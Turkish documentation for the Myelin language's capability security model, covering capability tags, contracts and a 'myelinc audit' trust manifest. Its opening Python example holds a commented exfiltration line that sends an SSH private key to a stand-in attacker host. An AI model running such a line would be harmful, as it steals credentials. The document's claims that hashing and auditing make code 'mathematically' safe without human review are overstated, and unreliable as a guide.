# Yetenekler ve Güvenlik Modeli

Myelin'in en önemli mimari temellerinden biri **Sıfır Gizli Yetki (Zero Ambient Authority)** ilkesidir. Python, C# veya JavaScript gibi dillerde yazılmış sıradan bir fonksiyon, haberiniz olmadan diskinizdeki dosyaları okuyabilir veya internete veri sızdırabilir:

```python
# Python'da güvensiz: vergi_hesapla fonksiyonu dosyalarınızı çalıyor olabilir mi?
def vergi_hesapla(gelir):
    # Arka planda gizlice bunu yapabilir:
    # requests.post("https://saldirgan.com", data=open("id_rsa").read())
    return gelir * 0.20
```

Myelin'de **saf fonksiyonlar matematiksel olarak izoledir**. Bir fonksiyon imzasında açıkça bir yetki etiketi tanımlanmamışsa, derleyici ve çalışma zamanı o fonksiyonun sistem kaynaklarına dokunmasını fiziksel olarak engeller.

---

## Yetenek Etiketleri (`!`)

Yetenekler fonksiyon imzasının sonuna `!` ve modül yolu ile eklenir:

```myelin
#fn fatura_gonder [eposta:str tutar:i64] !net.http !db.rw !io
  -- HTTP, veritabani ve konsol cikti yetkisine sahiptir
```

### Standart Yetenek Hiyerarşisi

| Yetenek | Kapsam | İzin Verilen İşlemler |
| :--- | :--- | :--- |
| `!io` | Konsol Girdi/Çıktı | `io.println` ile ekrana metin ve günlük basma |
| `!net` | Ağ İşlemleri | TCP, UDP soketleri ve yerel HTTP sunucusu (`http.serve`) |
| `!db` | Kalıcı Depolama | Yerleşik anahtar-değer deposuna okuma/yazma (`db.set`, `db.get`, `db.has`) |
| `!term` | Terminal Emülasyonu | ANSI renkleri ve metin stilleri (`term.green`, `term.bold`, vb.) |
| `!cli` | Komut Satırı Ortamı | Bayrak ve konum argümanlarını okuma (`cli.args`, `cli.flag_bool`, vb.) |
| `!fs` | Dosya Sistemi | Diskteki dosyalara doğrudan okuma ve yazma erişimi |
| `!time` / `!clock` | Sistem Saati | Saat ve sistem zamanlayıcılarını okuma işlemleri |
| `!unsafe.mem` | Ham Bellek | İşaretçi (pointer) manipülasyonu, ham bellek yazımları |
| `!unsafe.ffi` | Yabancı Fonksiyon Çağrıları | Dış C/Rust ABI bağlamalarına dinamik çağrılar (`#ext`) |

---

## Sözleşmeli Tasarım (`req` ve `ens`)

Myelin, kodun güvenilirliğini matematiksel olarak garanti altına almak için sözleşmeleri (contracts) ilk sınıf vatandaş olarak destekler:
- `req <Koşul>` (Ön koşul): Fonksiyon gövdesi çalışmadan önce kesinlikle doğru olmalıdır.
- `ens <Koşul>` (Son koşul): Fonksiyon döndüğünde kesinlikle doğru olmalıdır (`ret` dönüş değerini temsil eder).

```myelin
#fn bakiye_ekle [mevcut:i64 miktar:i64 -> i64]
  req miktar > 0
  ens ret > mevcut
  yeni_bakiye = mevcut + miktar
  = yeni_bakiye
```

Çalışma anında bu sözleşmelerden biri ihlal edilirse program kaynak kod satırı ile birlikte hata vererek hatalı mantığı hemen ortaya çıkarır.

---

## Güven ve Yetenek Denetimi (`myelinc audit`)

Yapay zeka ajanları binlerce satır kod ürettiğinde, mühendislerin tek tek her satırı okumasına gerek kalmaz. Bunun yerine NIST FIPS 180-4 standardında kriptografik SHA-256 doğrulama motoru çalıştırılır:

```bash
myelinc audit examples/cli_tool.myl
```

Bu komut insan denetimi için doğrulanmış bir **İnsan Güven Manifestosu (Human Trust Manifest)** üretir:

```text
================================================================================
                    MYELIN TRUST & CAPABILITY MANIFEST                          
================================================================================
Module:        main
Source:        examples/cli_tool.myl
SHA256:        f2a2fc46a7d5fe62f4640a2b2efa3092733f80d1603105858919bab447d23632
Safety Status: VERIFIED (Mathematically sound, zero ambient authority)

-- CAPABILITY & AUTHORITY AUDIT ------------------------------------------------
* Function '#fn main':
    Declared:  !io !cli !term
    Used:      !io
    Calls:     cli.flag_bool, cli.flag_int, cli.flag_str, io.println, str.fmt, term.bold, term.cyan, term.green, term.red, term.yellow
    Verdict:   [SAFE] Authorized by capability declaration

-- UNTRUSTED OPERATIONS & FOREIGN INTEROP --------------------------------------
  None (Fully sandboxed memory & execution, zero raw pointer dereferences)

-- FORMAL VERIFICATION & CONTRACTS ---------------------------------------------
Pre-conditions  (req): 0 verified
Post-conditions (ens): 0 verified
Flat Guards     (?):   0 runtime assertions & bounds checks

-- EXTRACTED MODULE DECLARATIONS -----------------------------------------------
Records (#rec): 0
Functions (#fn): 1
  - #fn main [] !io !cli !term
Tests (#test): 0
================================================================================
  TRUST VERDICT: 0 VIOLATIONS | ZERO AMBIENT AUTHORITY VERIFIED
================================================================================
```

### Yetenek İhlallerinin Yakalanması

Eğer üretilen kodda beyan edilmemiş bir yetki kullanılmaya çalışılırsa (örneğin `!db` izni olmayan bir fonksiyondan `db.set` çağrılması), `myelinc audit` bunu derhal tespit eder ve dağıtımı engeller:

```text
-- CAPABILITY & AUTHORITY AUDIT ------------------------------------------------
* Function '#fn sizinti':
    Declared:  [] (Pure)
    Used:      !db
    Calls:     db.set
    Verdict:   [VIOLATION: Capability '!db' used in function 'sizinti' but not declared!]
...
================================================================================
  TRUST VERDICT: REJECTED — CAPABILITY LEAK DETECTED
================================================================================
```

### CI/CD ve Otonom Denetim Modu (`--llm`)

Sürekli entegrasyon (CI/CD) hatları ve yapay zeka ajanları için tek satırlık çıktı protokolü desteklenir:

```bash
myelinc audit src/modul.myl --llm
```

Çıktı:
```text
OK AUDIT main | sha256=ce950f81299d59e9d3d061e1df75661c0256d8553fecf62aff244187b16a1d9f | recs=0 sums=0 fns=2 tests=0 exts=0 | contracts=req:0,ens:0,guards:0 | violations=0 | status=VERIFIED
```

Herhangi bir yetki veya ham bellek ihlalinde `violations=1` ve `status=REJECTED` bildirilerek derleyici çıkış kodu 1 (ExitCode::FAILURE) üretir ve güvenli olmayan kodun canlı ortama geçmesi kesin olarak engellenir.
